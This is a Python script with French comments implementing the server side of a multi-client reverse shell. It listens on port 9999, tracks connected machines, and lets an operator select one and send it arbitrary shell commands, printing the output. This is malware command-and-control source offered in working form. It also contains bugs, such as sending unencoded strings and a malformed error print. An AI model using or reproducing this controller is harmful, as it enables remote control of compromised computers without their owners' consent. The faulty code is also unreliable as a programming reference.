import socket  # pour la connection
import threading  # pour que le serveur puisse gérer plusieurs client à la fois
from queue import Queue
import os
import subprocess

THREADS = 2  # Nombre de thread
NUMBER = [1, 2]  # thread 1 et 2 -> dans une liste
BUFFER = 1024
queue = Queue()
connections = []  # liste1 = ce qui se rapporte à la connection elle même
addresses = []  # liste2 = ce qui se rapporte au adresse ip, quel client se connecte, ...

COMMANDS = {'help': ['Shows this help'],
            'list': ['Lists connected clients'],
            'select': ['Selects a client by its index. Takes index as a parameter'],
            'quit': ['Stops current connection with a client. To be used when client is selected'],
            'shutdown': ['Shuts server down'],
            }


def print_help():
    for cmd, v in COMMANDS.items():
        print("{0}:\t{1}".format(cmd, v[0]))
    return


# Créer un socket pour initier une connection
def socket_creation():
    try:
        global host  # variable global pour être utilisée plus tard dans une autre fonction
        global port
        global sock
        host = ''  # l'ip ou le sever sera à l'écoute (lui même dans ce cas)
        port = 9999  # le port sur lequel il sera à l'écoute pour recevoir des infos
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:  # Si la création du socket échoue on renvoit le message suivant
        print("Socket creation error: " + str(msg))


# En attente de connection
def socket_bind():
    try:
        global host  # On réutilise les variables globales créer plus tôt
        global port
        global sock
        print("Binding socket to port: " + str(port))
        sock.bind((host, port))  # on spécifie le port l'adresse sur laquelle écouter
        sock.listen(5)  # en attente de connection, 5 tentatives de connection avant de refuser l'acces
    except socket.error as msg:
        print("socket binding error: ", + str(msg) + "\n" + "Please retry ...")
        socket_bind()  # donc si erreur, on relance la fonction !


# Accepter la connection avec les clients et les sauvegarde sous forme de liste
def accept_socket():
    print("Accepting Socket ...")
    for c in connections:  # Fermer toutes les connections
        c.close()
    del connections[:]  # être sur de démmarer sur une bonne base en nettoyant toutes les connections et adresses
    del addresses[:]
    while 1:
        try:
            conn, address = sock.accept()
            conn.setblocking(1)  # pas de "timeout"
            connections.append(conn)  # ajout des connections et adresses à leur liste
            addresses.append(address)
            print("\nConnection established on " + address[0] + ":" + str(address[1]))  # Affiche l'IP et le PORT
        except socket.error as msg:
            print("Error while accepting the connection ..." + str(msg))


# Shell
def start_prompt():
    print("### Interactive Shell ###")
    while True:
        cmd = input('Shell> ')
        if cmd == 'list':
            # list_connection()  #Liste les connections
            print('----- Clients -----')
            for address in addresses:
                print(str(addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
            print('')
            continue
        elif 'select' in cmd:
            target = cmd.replace('select ', '')  # récupérer la valeur de l'index
            target = int(target) - 1  # la mettre au format int
            conn = connections[target]
            print("You are now connected to " + str(addresses[target][0]))
            print("Shell (" + str(addresses[target][0]) + ")>", end="")
            while True:
                try:
                    cmd = input()
                    if cmd == 'quit':
                        break
                    elif cmd == 'getinfo':
                        p = subprocess.check_output("ipconfig")
                        print(p, end="")
                        conn.send(p)
                        client_response = str(conn.recv(20480))
                        print(client_response)
                    elif len(str.encode(cmd)) > 0:
                        conn.send(cmd)
                        client_response = str(conn.recv(20480))
                        print(client_response, end="")
                except socket.error as msg:
                    print("Connection was lost" + str(msg))
                    break
        elif cmd == 'shutdown':
            queue.task_done()
            queue.task_done()
            print('Server shutdown')
            break
        elif cmd == 'help':
            print_help()


# Threads
def create_threads():
    for a in range(THREADS):
        t = threading.Thread(target=work)  # target = le job qu'il va faire
        t.daemon = True  # Permet de kill le thread en même temps que la fonction principal
        t.start()


# Définir work pour faire les deux jobs (maintenir la connection et envoyer des commandes)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_creation()
            socket_bind()
            accept_socket()
        if x == 2:
            start_prompt()
        queue.task_done()  # libérer la mémoire quand le tache est finie


# Jobs
def create_jobs():
    for x in NUMBER:
        queue.put(x)
    queue.join()


create_threads()
create_jobs()
